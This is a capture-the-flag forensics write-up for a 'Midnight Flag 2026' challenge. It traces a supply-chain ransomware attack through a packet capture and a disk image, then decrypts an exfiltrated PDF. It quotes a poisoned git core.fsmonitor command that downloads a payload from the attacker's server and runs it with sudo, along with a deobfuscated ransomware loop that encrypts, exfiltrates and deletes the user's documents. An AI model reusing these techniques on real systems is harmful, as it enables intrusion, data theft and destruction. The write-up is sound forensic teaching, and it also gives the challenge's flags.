# Midnight VMEM - Writeup

**CTF**: Midnight Flag 2026
**Category**: Forensics
**Flag**: `MCTF{Th1S_Is_Y0uR_f7rst_P@rt0x_F1n@l_P4rt$}`

## TL;DR

PCAP analysis reveals a supply-chain attack via malicious git `core.fsmonitor`. The fsmonitor command downloads and executes a payload, and also leaks flag part 1 as base64. The VMDK disk image contains the actual ransomware hidden in `/usr/lib/python3.12/usercustomize.py` — a Python script implementing ChaCha20 encryption with a key derived from system fingerprint (`sha512(hostname:kernel:machine_id:username)`). Extracting those values from the mounted disk and decrypting the exfiltrated file from the PCAP yields a PDF containing flag part 2.

## Architecture

- **Victim**: Ubuntu 24.04, kernel 6.17.0-14-generic, hostname `midnight`, user `john`
- **Attacker C2**: 192.168.1.64, ports 8443 (TLS payload download) and 9000 (raw exfiltration)
- **Victim server**: Flask/Werkzeug 3.1.6 on 192.168.1.81:5000 (bug bounty target)
- **Attack vector**: Malicious `.git/config` `core.fsmonitor` in cloned repo

## Flag Part 1 — PCAP Analysis

### Git Config Poisoning

The PCAP (`capture.pcap`, 14MB pcapng) shows the attacker at 192.168.1.41 discovering the victim's Flask server (192.168.1.81:5000) and finding a `.git/index` via nikto scan.

The cloned git repo at `/home/john/Desktop/Project/bug-git/` has a poisoned `.git/config`:

```ini
[core]
    fsmonitor = "curl -k -s -o /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 https://192.168.1.64:8443/payload && chmod +x /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 && sudo /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 && echo 'e1RoMVNfSXNfWTB1Ul9mN3JzdF9QQHJ0fQ==' > /dev/null"
```

The base64 string decodes to flag part 1:

```
e1RoMVNfSXNfWTB1Ul9mN3JzdF9QQHJ0fQ== → {Th1S_Is_Y0uR_f7rst_P@rt}
```

### Exfiltrated Encrypted File

From PCAP TCP stream on port 9000 (stream 6383), the attacker exfiltrates data from victim to C2. The protocol format:

```
[4 bytes: filename length (big-endian)] [filename] [4 bytes: data length] [encrypted data]
```

Extracted: `Critical_RCE_Disclosure.pdf.hellcat` (77656 bytes encrypted).

```bash
tshark -r capture.pcap -Y "tcp.port==9000 && ip.src==192.168.1.41 && tcp.len>0" \
    -T fields -e data | tr -d '\n' | xxd -r -p > exfiltrated_raw.bin
```

## Flag Part 2 — VMDK Analysis

### Mounting the Disk

```bash
sudo modprobe nbd max_part=8
sudo qemu-nbd --connect=/dev/nbd0 midnight-disk1.vmdk
sudo mount -o ro /dev/nbd0p2 /mnt/vmdk
```

Partition layout: GPT, 1MB BIOS boot + 50GB ext4 Linux filesystem.

### Finding the Ransomware

The downloaded binary `/tmp/bbf496b0cb0e34a44b72f4ee97c0db02` was deleted after execution. The real ransomware is a **Python persistence mechanism** planted in the system-wide Python startup file:

```
/usr/lib/python3.12/usercustomize.py
```

This file executes automatically whenever Python 3.12 runs (including when `git` triggers `core.fsmonitor`). The file is obfuscated with base64-encoded imports and variable names (`_0x...` pattern).

### Ransomware Analysis (Deobfuscated)

The ransomware implements:

1. **System fingerprinting**: Collects hostname, kernel release, machine-id, username
2. **C2 beacon**: POSTs system info as JSON to `https://192.168.1.64:8443/json`
3. **Key derivation**: `sha512(f"{hostname}:{kernel}:{machine_id}:{username}")` → key (bytes 0-31) + nonce (bytes 32-43)
4. **ChaCha20 encryption**: Custom pure-Python ChaCha20 implementation (20 rounds, standard quarter-round)
5. **Exfiltration**: Sends encrypted files to `192.168.1.64:9000` with filename + data length headers
6. **Destruction**: Deletes original files after encryption

Key code (deobfuscated):

```python
def derive_key():
    seed = f"{platform.node()}:{platform.release()}:{machine_id}:{getpass.getuser()}"
    digest = hashlib.sha512(seed.encode()).digest()
    return digest[:32], digest[32:44]  # key, nonce

target_dir = os.path.expanduser("~/Documents")
key, nonce = derive_key()

for fname in os.listdir(target_dir):
    with open(fpath, "rb") as f:
        plaintext = f.read()
    ciphertext = chacha20_encrypt(plaintext, key, nonce)
    exfiltrate(fname + ".hellcat", ciphertext)
    os.remove(fpath)
```

### Extracting Key Derivation Inputs

From the mounted VMDK:

| Parameter | Source | Value |
|-----------|--------|-------|
| hostname | `/etc/hostname` | `midnight` |
| kernel | `/lib/modules/` | `6.17.0-14-generic` |
| machine_id | `/etc/machine-id` | `6ea3ad95b0cb495d86291db1c798247f` |
| username | `getpass.getuser()` | `john` (script runs in john's context via git fsmonitor) |

Seed string: `midnight:6.17.0-14-generic:6ea3ad95b0cb495d86291db1c798247f:john`

### Decryption

```python
import hashlib
seed = "midnight:6.17.0-14-generic:6ea3ad95b0cb495d86291db1c798247f:john"
digest = hashlib.sha512(seed.encode()).digest()
key = digest[:32]    # e4f5561c8dc30dc7fd2eaee26a2c2cdac9361c89cd709bda3841c12b1d03c487
nonce = digest[32:44] # a4aa7aed185008cc2e0d50ce

decrypted = chacha20_encrypt(encrypted_data, key, nonce)  # XOR-based, encrypt=decrypt
# Result: %PDF-1.7 ...
```

The decrypted PDF is a HackerOne vulnerability report (RCE via command injection in `/api/v4/export`). Page 3 contains the flag:

```
MCTF{0x_F1n@l_P4rt$}
```

## Key Challenges

- **Red herring binary**: `/tmp/bbf496b0cb0e34a44b72f4ee97c0db02` was deleted and irrelevant — the actual ransomware was in `usercustomize.py`
- **Not Fernet/AES**: Despite `fernet-go` and `cryptography` library presence on the system, the ransomware uses a custom ChaCha20 implementation
- **Username ambiguity**: Script runs via `sudo` from git fsmonitor, but `getpass.getuser()` returns `john` (the logged-in user), not `root`
- **Exfiltration protocol**: Custom binary protocol on port 9000 with length-prefixed filename and data fields

## Attack Chain Summary

```
1. Attacker scans victim (nikto) → finds .git/index
2. Victim clones poisoned repo → git fsmonitor triggers
3. fsmonitor: curl payload from C2 + echo base64 flag part 1
4. usercustomize.py (already planted): fingerprints system, derives ChaCha20 key
5. Encrypts ~/Documents/*.pdf → exfiltrates to C2:9000 → deletes originals
6. Decrypted PDF contains flag part 2
```

## Files

- `capture.pcap`: Network capture with git clone, C2 comms, exfiltration
- `midnight-disk1.vmdk`: Victim disk image (Ubuntu 24.04)
- `exfiltrated_raw.bin`: Raw exfiltrated data from PCAP port 9000
- `decrypted.pdf`: Recovered PDF with flag part 2

## References

- ChaCha20: RFC 7539 (quarter-round, 20 rounds, 256-bit key + 96-bit nonce)
- Python `usercustomize.py`: Auto-loaded by site.py on every Python invocation
- Git `core.fsmonitor`: Arbitrary command execution on git operations
